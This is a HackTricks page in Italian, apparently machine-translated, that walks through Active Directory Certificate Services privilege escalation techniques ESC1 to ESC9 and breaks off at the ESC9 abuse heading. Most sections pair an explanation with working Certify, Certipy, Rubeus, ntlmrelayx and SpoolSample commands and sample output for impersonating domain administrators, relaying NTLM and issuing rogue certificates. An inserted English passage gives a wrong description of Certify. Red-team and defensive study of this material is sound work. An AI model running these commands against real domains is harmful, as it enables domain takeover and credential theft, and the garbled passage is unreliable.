# AD CS Escalation di Dominio

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

**Questa è una sintesi delle sezioni delle tecniche di escalation degli articoli:**
* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Modelli di Certificato Malconfigurati - ESC1

### Spiegazione

### Modelli di Certificato Malconfigurati - ESC1 Spiegati

* **I diritti di iscrizione vengono concessi agli utenti a basso privilegio dall'Enterprise CA.**
* **Non è richiesta l'approvazione del responsabile.**
* **Non sono necessarie firme da parte del personale autorizzato.**
* **I descrittori di sicurezza sui modelli di certificato sono eccessivamente permissivi, consentendo agli utenti a basso privilegio di ottenere i diritti di iscrizione.**
* **I modelli di certificato sono configurati per definire EKU che facilitano l'autenticazione:**
* Sono inclusi identificatori di utilizzo esteso della chiave (EKU) come l'autenticazione del client (OID 1.3.6.1.5.5.7.3.2), l'autenticazione del client PKINIT (1.3.6.1.5.2.3.4), l'accesso tramite smart card (OID 1.3.6.1.4.1.311.20.2.2), qualsiasi scopo (OID 2.5.29.37.0), o nessun EKU (SubCA).
* **È consentito ai richiedenti di includere un subjectAltName nella richiesta di firma del certificato (CSR):**
* Active Directory (AD) dà priorità al subjectAltName (SAN) in un certificato per la verifica dell'identità se presente. Ciò significa che specificando il SAN in una CSR, è possibile richiedere un certificato per impersonare qualsiasi utente (ad esempio, un amministratore di dominio). Se un richiedente può specificare un SAN è indicato nell'oggetto AD del modello di certificato tramite la proprietà `mspki-certificate-name-flag`. Questa proprietà è una bitmask e la presenza del flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` permette la specifica del SAN da parte del richiedente.

{% hint style="danger" %}
La configurazione descritta consente agli utenti a basso privilegio di richiedere certificati con qualsiasi SAN a scelta, consentendo l'autenticazione come qualsiasi principale di dominio tramite Kerberos o SChannel.
{% endhint %}

Questa funzionalità è talvolta abilitata per supportare la generazione on-the-fly di certificati HTTPS o di host da parte di prodotti o servizi di distribuzione, o a causa di una mancanza di comprensione.

Si osserva che la creazione di un certificato con questa opzione genera un avviso, il che non avviene quando viene duplicato un modello di certificato esistente (come il modello `WebServer`, che ha `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` abilitato) e quindi modificato per includere un OID di autenticazione.

### Abuso

Per **trovare modelli di certificato vulnerabili** è possibile eseguire:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Per **sfruttare questa vulnerabilità per impersonare un amministratore**, si potrebbe eseguire:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Quindi puoi trasformare il certificato generato nel formato **`.pfx`** e usarlo per **autenticarti nuovamente usando Rubeus o certipy**:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
I binari di Windows "Certreq.exe" e "Certutil.exe" possono essere utilizzati per generare il PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

L'enumerazione dei modelli di certificato all'interno dello schema di configurazione della foresta AD, in particolare quelli che non richiedono approvazione o firme, che possiedono un EKU di autenticazione del client o di accesso con smart card e con il flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` abilitato, può essere eseguita eseguendo la seguente query LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Modelli di certificato mal configurati - ESC2

### Spiegazione

Il secondo scenario di abuso è una variante del primo:

1. I diritti di registrazione vengono concessi agli utenti a bassi privilegi dall'Enterprise CA.
2. Viene disabilitato il requisito di approvazione del responsabile.
3. Viene omessa la necessità di firme autorizzate.
4. Un descrittore di sicurezza eccessivamente permessivo sul modello di certificato concede aiutomaticamente i diritti di registrazione del certificato agli utenti a bassi privilegi.
5. **Il modello di certificato è definito per includere l'EKU di qualsiasi scopo o nessuna EKU.**

L'**EKU di qualsiasi scopo** permette di ottenere un certificato per **qualsiasi scopo**, inclusa l'autenticazione del client, l'autenticazione del server, la firma del codice, ecc. La stessa **tecnica utilizzata per ESC3** può essere impiegata per sfruttare questo scenario.

I certificati **senza EKU**, che agiscono come certificati di CA subordinati, possono essere sfruttati per **qualsiasi scopo** e possono **anche essere utilizzati per firmare nuovi certificati**. Pertanto, un attaccante potrebbe specificare EKU o campi arbitrari nei nuovi certificati utilizzando un certificato di CA subordinato.

Tuttavia, i nuovi certificati creati per **l'autenticazione di dominio** non funzioneranno se il certificato di CA subordinato non è affidato all'oggetto **`NTAuthCertificates`**, che è l'impostazione predefinita. Tuttavia, un attaccante può comunque creare **nuovi certificati con qualsiasi EKU** e valori di certificato arbitrari. Questi potrebbero essere potenzialmente **sfruttati** per una vasta gamma di scopi (ad esempio, firma del codice, autenticazione del server, ecc.) e potrebbero avere implicazioni significative per altre applicazioni nella rete come SAML, AD FS o IPSec.

Per enumerare i modelli che corrispondono a questo scenario all'interno dello schema di configurazione della foresta AD, è possibile eseguire la seguente query LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Modelli di agente di registrazione non configurati correttamente - ESC3

### Spiegazione

Questo scenario è simile al primo e al secondo, ma **sfrutta** un **EKU diverso** (Certificate Request Agent) e **2 modelli diversi** (quindi ha 2 set di requisiti).

L'EKU dell'agente di richiesta di certificato (OID 1.3.6.1.4.1.311.20.2.1), noto come **Enrollment Agent** nella documentazione di Microsoft, consente a un principale di **registrarsi** per un **certificato** **per conto di un altro utente**.

L'**"agente di registrazione"** si registra in un tale **modello** e utilizza il certificato risultante per **firmare congiuntamente una CSR per conto dell'altro utente**. Quindi **invia** la **CSR firmata congiuntamente** all'AC, registrandosi in un **modello** che **consente "la registrazione per conto di"**, e l'AC risponde con un **certificato appartenente all'"altro" utente**.

**Requisiti 1:**

- I diritti di registrazione sono concessi agli utenti a bassi privilegi dall'AC aziendale.
- L'approvazione del responsabile è omessa.
- Nessun requisito per firme autorizzate.
- Il descrittore di sicurezza del modello di certificato è eccessivamente permessivo, concedendo i diritti di registrazione agli utenti a bassi privilegi.
- Il modello di certificato include l'EKU dell'agente di richiesta di certificato, consentendo la richiesta di altri modelli di certificato per conto di altri principali.

**Requisiti 2:**

- L'AC aziendale concede i diritti di registrazione agli utenti a bassi privilegi.
- Viene bypassata l'approvazione del responsabile.
- La versione dello schema del modello è 1 o superiore a 2 e specifica un requisito di rilascio della politica dell'applicazione che richiede l'EKU dell'agente di richiesta di certificato.
- Un EKU definito nel modello di certificato consente l'autenticazione di dominio.
- Le restrizioni per gli agenti di registrazione non vengono applicate all'AC.

### Abuso

Puoi utilizzare [**Certify**](https://github.com/GhostPack/Certify) o [**Certipy**](https://github.com/ly4k/Certipy) per sfruttare questo scenario:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Gli **utenti** che sono autorizzati a **ottenere** un **certificato di agente di registrazione**, i modelli in cui gli **agenti di registrazione** sono autorizzati a registrarsi e gli **account** per conto dei quali l'agente di registrazione può agire possono essere limitati dalle CA aziendali. Ciò viene realizzato aprendo il **snap-in** `certsrc.msc`, **facendo clic con il pulsante destro del mouse sulla CA**, **cliccando su Proprietà** e quindi **passando** alla scheda "Agenti di registrazione".

Tuttavia, si nota che l'impostazione **predefinita** per le CA è "Non limitare gli agenti di registrazione". Quando la restrizione sugli agenti di registrazione viene abilitata dagli amministratori, impostandola su "Limita gli agenti di registrazione", la configurazione predefinita rimane estremamente permissiva. Consente a **Tutti** l'accesso per registrarsi in tutti i modelli come chiunque.

## Controllo degli accessi vulnerabili ai modelli di certificato - ESC4

### **Spiegazione**

Il **descrittore di sicurezza** sui **modelli di certificato** definisce i **permessi** specifici che le **principali AD** possiedono riguardo al modello.

Se un **attaccante** possiede i **permessi** necessari per **modificare** un **modello** e **istituire** eventuali **mancate configurazioni** sfruttabili descritte nelle **sezioni precedenti**, potrebbe facilitare l'escalation dei privilegi.

I permessi rilevanti applicabili ai modelli di certificato includono:

- **Proprietario:** Concede il controllo implicito sull'oggetto, consentendo la modifica di qualsiasi attributo.
- **Controllo completo:** Abilita l'autorità completa sull'oggetto, compresa la capacità di modificare qualsiasi attributo.
- **Scrivi proprietario:** Consente la modifica del proprietario dell'oggetto a un principale sotto il controllo dell'attaccante.
- **Scrivi Dacl:** Consente l'aggiustamento dei controlli di accesso, potenzialmente concedendo all'attaccante il controllo completo.
- **Scrivi proprietà:** Autorizza la modifica di qualsiasi proprietà dell'oggetto.

### Abuso

Un esempio di privesc come quello precedente:

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

ESC4 si verifica quando un utente ha privilegi di scrittura su un modello di certificato. Questo può essere sfruttato, ad esempio, per sovrascrivere la configurazione del modello di certificato per renderlo vulnerabile a ESC1.

Come possiamo vedere nel percorso sopra, solo `JOHNPC` ha questi privilegi, ma il nostro utente `JOHN` ha il nuovo collegamento `AddKeyCredentialLink` a `JOHNPC`. Poiché questa tecnica è correlata ai certificati, ho implementato anche questo attacco, noto come [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Ecco un piccolo anteprima del comando `shadow auto` di Certipy per recuperare l'hash NT della vittima.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** può sovrascrivere la configurazione di un modello di certificato con un singolo comando. Per **default**, Certipy sovrascriverà la configurazione per renderla **vulnerabile a ESC1**. Possiamo anche specificare il parametro **`-save-old` per salvare la vecchia configurazione**, che sarà utile per **ripristinare** la configurazione dopo il nostro attacco.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Controllo degli accessi agli oggetti PKI vulnerabili - ESC5

### Spiegazione

La vasta rete di relazioni basate su ACL, che include diversi oggetti oltre ai modelli di certificato e all'autorità di certificazione, può influire sulla sicurezza dell'intero sistema AD CS. Questi oggetti, che possono influire significativamente sulla sicurezza, comprendono:

* L'oggetto computer AD del server CA, che può essere compromesso attraverso meccanismi come S4U2Self o S4U2Proxy.
* Il server RPC/DCOM del server CA.
* Qualsiasi oggetto o contenitore AD discendente all'interno del percorso specifico `CN=Servizi chiave pubbliche,CN=Servizi,CN=Configurazione,DC=<DOMINIO>,DC=<COM>`. Questo percorso include, ma non si limita a, contenitori e oggetti come il contenitore dei modelli di certificato, il contenitore delle autorità di certificazione, l'oggetto NTAuthCertificates e il contenitore dei servizi di registrazione.

La sicurezza del sistema PKI può essere compromessa se un attaccante con privilegi limitati riesce a ottenere il controllo su uno di questi componenti critici.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Spiegazione

L'argomento discusso nel [**post di CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) riguarda anche le implicazioni del flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, come descritto da Microsoft. Questa configurazione, quando attivata su un'autorità di certificazione (CA), consente l'inclusione di **valori definiti dall'utente** nel **nome alternativo del soggetto** per **qualsiasi richiesta**, inclusa quella costruita da Active Directory®. Di conseguenza, questa disposizione consente a un **intruso** di iscriversi tramite **qualsiasi modello** configurato per l'**autenticazione** di dominio, in particolare quelli aperti all'iscrizione di utenti **senza privilegi**, come il modello Utente standard. Di conseguenza, è possibile ottenere un certificato che consente all'intruso di autenticarsi come amministratore di dominio o **qualsiasi altra entità attiva** all'interno del dominio.

**Nota**: L'approccio per aggiungere **nomi alternativi** a una richiesta di firma del certificato (CSR), tramite l'argomento `-attrib "SAN:"` in `certreq.exe` (chiamato "Coppie nome-valore"), presenta una **differenza** rispetto alla strategia di sfruttamento dei SAN in ESC1. Qui, la differenza sta in **come le informazioni dell'account sono incapsulate** - all'interno di un attributo del certificato, anziché di un'estensione.

### Abuso

Per verificare se l'impostazione è attivata, le organizzazioni possono utilizzare il seguente comando con `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Questa operazione utilizza essenzialmente l'**accesso remoto al registro di sistema**, pertanto, un approccio alternativo potrebbe essere:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Strumenti come [**Certify**](https://github.com/GhostPack/Certify) e [**Certipy**](https://github.com/ly4k/Certipy) sono in grado di rilevare questa errata configurazione e sfruttarla:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Per modificare queste impostazioni, assumendo di possedere i diritti di amministratore di dominio o equivalenti, è possibile eseguire il seguente comando da qualsiasi postazione di lavoro:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Per disabilitare questa configurazione nel tuo ambiente, il flag può essere rimosso con:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
Dopo gli aggiornamenti di sicurezza di maggio 2022, i certificati appena emessi conterranno un'estensione di sicurezza che incorpora la proprietà `objectSid` del richiedente. Per ESC1, questo SID è derivato dal SAN specificato. Tuttavia, per ESC6, il SID riflette l'`objectSid` del richiedente, non il SAN.\
Per sfruttare ESC6, è essenziale che il sistema sia suscettibile a ESC10 (Mappature deboli dei certificati), che dà priorità al SAN rispetto alla nuova estensione di sicurezza.
{% endhint %}

## Controllo degli accessi vulnerabili all'Autorità di Certificazione - ESC7

### Attacco 1

#### Spiegazione

Il controllo degli accessi per un'autorità di certificazione è gestito attraverso un insieme di autorizzazioni che regolano le azioni della CA. Queste autorizzazioni possono essere visualizzate accedendo a `certsrv.msc`, facendo clic con il pulsante destro del mouse su una CA, selezionando Proprietà e quindi passando alla scheda Sicurezza. Inoltre, le autorizzazioni possono essere enumerate utilizzando il modulo PSPKI con comandi come:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Questo fornisce informazioni sui diritti primari, ovvero **`ManageCA`** e **`ManageCertificates`**, correlati ai ruoli di "amministratore CA" e "gestore certificati" rispettivamente.

#### Abuso

Avere i diritti **`ManageCA`** su un'autorità di certificazione consente al principale di manipolare le impostazioni in remoto utilizzando PSPKI. Ciò include l'attivazione del flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`** per consentire la specifica di SAN in qualsiasi modello, un aspetto critico dell'escalation di dominio.

La semplificazione di questo processo è possibile utilizzando il cmdlet **Enable-PolicyModuleFlag** di PSPKI, consentendo modifiche senza interazione diretta con l'interfaccia grafica.

Il possesso dei diritti **`ManageCertificates`** facilita l'approvazione delle richieste in sospeso, eludendo efficacemente la protezione "approvazione del gestore certificati CA".

È possibile utilizzare una combinazione dei moduli **Certify** e **PSPKI** per richiedere, approvare e scaricare un certificato:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attacco 2

#### Spiegazione

{% hint style="warning" %}
Nell'**attacco precedente** sono state utilizzate le autorizzazioni **`Manage CA`** per **abilitare** il flag **EDITF\_ATTRIBUTESUBJECTALTNAME2** per eseguire l'attacco **ESC6**, ma ciò non avrà alcun effetto fino a quando il servizio CA (`CertSvc`) non verrà riavviato. Quando un utente ha il diritto di accesso `Manage CA`, l'utente è anche autorizzato a **riavviare il servizio**. Tuttavia, ciò **non significa che l'utente possa riavviare il servizio in remoto**. Inoltre, **ESC6 potrebbe non funzionare immediatamente** nella maggior parte degli ambienti patchati a causa degli aggiornamenti di sicurezza di maggio 2022.
{% endhint %}

Pertanto, viene presentato un altro attacco.

Prerequisiti:

* Solo **autorizzazione `ManageCA`**
* Autorizzazione **`Manage Certificates`** (può essere concessa da **`ManageCA`**)
* Il modello di certificato **`SubCA`** deve essere **abilitato** (può essere abilitato da **`ManageCA`**)

La tecnica si basa sul fatto che gli utenti con il diritto di accesso `Manage CA` _e_ `Manage Certificates` possono **emettere richieste di certificato fallite**. Il modello di certificato **`SubCA`** è **vulnerabile a ESC1**, ma **solo gli amministratori** possono iscriversi al modello. Pertanto, un **utente** può **richiedere** di iscriversi al **`SubCA`** - che verrà **rifiutato** - ma **successivamente emesso dal responsabile**.

#### Abuso

Puoi **concederti l'accesso `Manage Certificates`** aggiungendo il tuo utente come nuovo ufficiale.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Il modello **`SubCA`** può essere **abilitato sulla CA** con il parametro `-enable-template`. Per impostazione predefinita, il modello `SubCA` è abilitato.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Se abbiamo soddisfatto i prerequisiti per questo attacco, possiamo iniziare **richiedendo un certificato basato sul modello `SubCA`**.

**Questa richiesta verrà rifiutata**, ma salveremo la chiave privata e annoteremo l'ID della richiesta.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Con il nostro **`Gestisci CA` e `Gestisci Certificati`**, possiamo quindi **emettere la richiesta di certificato fallita** con il comando `ca` e il parametro `-issue-request <ID richiesta>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
E infine, possiamo **recuperare il certificato emesso** con il comando `req` e il parametro `-retrieve <ID richiesta>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay agli endpoint HTTP di AD CS - ESC8

### Spiegazione

{% hint style="info" %}
In ambienti in cui è installato **AD CS**, se esiste un **endpoint di registrazione web vulnerabile** e almeno un **modello di certificato è pubblicato** che consente la **registrazione del computer di dominio e l'autenticazione del client** (come il modello predefinito **`Machine`**), diventa possibile per **qualsiasi computer con il servizio spooler attivo essere compromesso da un attaccante**!
{% endhint %}

Sono supportati diversi **metodi di registrazione basati su HTTP** da AD CS, resi disponibili attraverso ruoli server aggiuntivi che gli amministratori possono installare. Queste interfacce per la registrazione dei certificati basata su HTTP sono suscettibili ad **attacchi di relay NTLM**. Un attaccante, da una **macchina compromessa, può impersonare qualsiasi account AD che si autentica tramite NTLM in ingresso**. Mentre si finge di essere l'account della vittima, queste interfacce web possono essere accessibili da un attaccante per **richiedere un certificato di autenticazione del client utilizzando i modelli di certificato `User` o `Machine`**.

* L'**interfaccia di registrazione web** (un'applicazione ASP più vecchia disponibile su `http://<caserver>/certsrv/`), di default supporta solo HTTP, il che non offre protezione contro gli attacchi di relay NTLM. Inoltre, permette esplicitamente solo l'autenticazione NTLM tramite l'intestazione HTTP di autorizzazione, rendendo metodi di autenticazione più sicuri come Kerberos inapplicabili.
* Il **Servizio di Registrazione dei Certificati** (CES), il **Servizio Web di Politica di Registrazione dei Certificati** (CEP) e il **Servizio di Registrazione Dispositivi di Rete** (NDES) di default supportano l'autenticazione negoziata tramite l'intestazione HTTP di autorizzazione. L'autenticazione negoziata **supporta sia** Kerberos che **NTLM**, consentendo a un attaccante di **ridurre a NTLM** l'autenticazione durante gli attacchi di relay. Sebbene questi servizi web abilitino HTTPS di default, HTTPS da solo **non protegge dagli attacchi di relay NTLM**. La protezione dagli attacchi di relay NTLM per i servizi HTTPS è possibile solo quando HTTPS è combinato con il binding del canale. Purtroppo, AD CS non attiva Extended Protection for Authentication su IIS, che è richiesto per il binding del canale.

Un **problema** comune con gli attacchi di relay NTLM è la **breve durata delle sessioni NTLM** e l'incapacità dell'attaccante di interagire con i servizi che **richiedono la firma NTLM**.

Tuttavia, questa limitazione viene superata sfruttando un attacco di relay NTLM per acquisire un certificato per l'utente, poiché il periodo di validità del certificato determina la durata della sessione e il certificato può essere utilizzato con servizi che **richiedono la firma NTLM**. Per istruzioni su come utilizzare un certificato rubato, fare riferimento a:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

Un'altra limitazione degli attacchi di relay NTLM è che **una macchina controllata dall'attaccante deve essere autenticata da un account della vittima**. L'attaccante potrebbe aspettare o cercare di **forzare** questa autenticazione:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Abuso**

[**Certify**](https://github.com/GhostPack/Certify)'s `cas` enumera gli **endpoint HTTP AD CS abilitati**:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

La proprietà `msPKI-Enrollment-Servers` viene utilizzata dalle Autorità di Certificazione (CA) aziendali per archiviare gli endpoint del servizio di registrazione dei certificati (CES). Questi endpoint possono essere analizzati e elencati utilizzando lo strumento **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
#### Abuso con Certify

Certify is a tool that allows you to request and manage SSL/TLS certificates. It can be abused in an Active Directory environment to escalate privileges and gain unauthorized access.

##### 1. Obtain a certificate signing request (CSR)

First, you need to generate a certificate signing request (CSR) using Certify. This can be done by selecting the desired certificate template and providing the necessary information.

##### 2. Submit the CSR to the Certificate Authority (CA)

Next, you need to submit the CSR to the Certificate Authority (CA) for signing. This can be done using Certify or any other tool that supports certificate signing.

##### 3. Import the signed certificate

Once the certificate is signed by the CA, you need to import it into the Active Directory environment. This can be done using Certify or the Certificate MMC snap-in.

##### 4. Assign permissions to the certificate

To escalate privileges, you need to assign permissions to the certificate that allow you to impersonate other users or perform other malicious actions. This can be done using Certify or the Certificate MMC snap-in.

##### 5. Use the certificate for unauthorized access

Finally, you can use the certificate to authenticate and gain unauthorized access to resources in the Active Directory environment. This can be done by configuring applications or services to use the certificate for authentication.

It is important to note that abusing Certify requires administrative privileges in the Active Directory environment. Therefore, it is crucial to secure the administrative accounts and limit access to the Certify tool to prevent unauthorized abuse.
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuso con [Certipy](https://github.com/ly4k/Certipy)

La richiesta di un certificato viene effettuata da Certipy di default basandosi sul modello `Machine` o `User`, determinato dal fatto che il nome dell'account inoltrato termini con `$`. La specifica di un modello alternativo può essere ottenuta tramite l'utilizzo del parametro `-template`.

Una tecnica come [PetitPotam](https://github.com/ly4k/PetitPotam) può quindi essere utilizzata per costringere l'autenticazione. Quando si tratta di controller di dominio, è necessaria la specifica di `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#5485" id="5485"></a>

### Spiegazione

Il nuovo valore **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) per **`msPKI-Enrollment-Flag`**, chiamato ESC9, impedisce l'inclusione dell'**estensione di sicurezza `szOID_NTDS_CA_SECURITY_EXT`** in un certificato. Questo flag diventa rilevante quando `StrongCertificateBindingEnforcement` è impostato su `1` (impostazione predefinita), a differenza dell'impostazione `2`. La sua rilevanza aumenta in scenari in cui potrebbe essere sfruttato un mapping di certificati più debole per Kerberos o Schannel (come in ESC10), dato che l'assenza di ESC9 non altererebbe i requisiti.

Le condizioni in cui l'impostazione di questo flag diventa significativa includono:
- `StrongCertificateBindingEnforcement` non è impostato su `2` (con l'impostazione predefinita su `1`), o `CertificateMappingMethods` include il flag `UPN`.
- Il certificato è contrassegnato con il flag `CT_FLAG_NO_SECURITY_EXTENSION` nell'impostazione `msPKI-Enrollment-Flag`.
- Il certificato specifica qualsiasi EKU di autenticazione del client.
- Sono disponibili le autorizzazioni `GenericWrite` su qualsiasi account per comprometterne un altro.

### Scenario di abuso

